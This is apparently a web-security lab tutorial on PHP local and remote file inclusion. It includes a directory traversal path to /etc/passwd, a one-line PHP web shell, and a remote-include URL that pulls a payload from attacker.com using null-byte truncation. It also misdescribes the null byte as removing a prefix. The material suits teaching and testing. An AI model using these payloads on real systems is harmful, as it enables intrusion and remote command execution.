# File Inclusion

### File Include Vulnerabilities

In a lot of applications, developers need to include files to load classes or to share templates between multiple web pages.

File include vulnerabilities come from a lack of filtering when a user-controlled parameter is used as part of a file name in a call to an including function (`require`, `require_once`, `include` or `include_once` in PHP for example). If the call to one of these methods is vulnerable, an attacker will be able to manipulate the function to load his own code. File include vulnerabilities can also be used as a directory traversal to read arbitrary files. However, if the arbitrary code contains an opening PHP tag, the file will be interpreted as PHP code.

This including function can allow the loading of local resources or  remote resource (a website, for example). If vulnerable, it will lead to:

- **Local File Include (LFI):** A local file is read and interpreted.
- **Remote File Include (RFI):** A remote file is retrieved and interpreted.

By default, PHP disables loading of remote files, thanks to the configuration option: `allow_url_include`. In the ISO, it has been enabled to allow you to test it.

In this first example, you can see an error message, as soon as you inject a special character (a quote, for example) into the parameter:

```
Warning: include(intro.php'): failed to open stream: No such file or directory in /var/www/fileincl/example1.php on line 7 Warning: include(): Failed opening 'intro.php'' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/fileincl/example1.php on line 7
```

If you read the error message carefully, you can extract a lot of information:

- The path of the script: `/var/www/fileincl/example1.php`.
- The function used: `include()`.
- The value used in the call to `include` is the value we injected `intro.php'` without any addition or filtering.

We can use the methods used to detect directory traversal, to detect file include. For example, you can try to include `/etc/passwd` by using the `../` technique.

```
From:
www.example.com/?page=index.php
To:
www.example.com/?page=../../../etc/passwd
```

If this works, then we can try loading the following inside a file to execute a command:

```php
<?php 
  system($_GET['c']);
?>
```

This is then invoked with ```https://www.example.com/?page=maliciousfile.txt&c=command

If the site adds a prefix, this can potentially be removed with a null byte ```%00``` (if their PHP version is lower than 5.3.4). For RFI, you can get rid of the suffix, by adding `&blah=` or `?blah=` depending on your URL:

```http://target.com/?page=http://attacker.com/maliciousfile.txt%00&c=command```

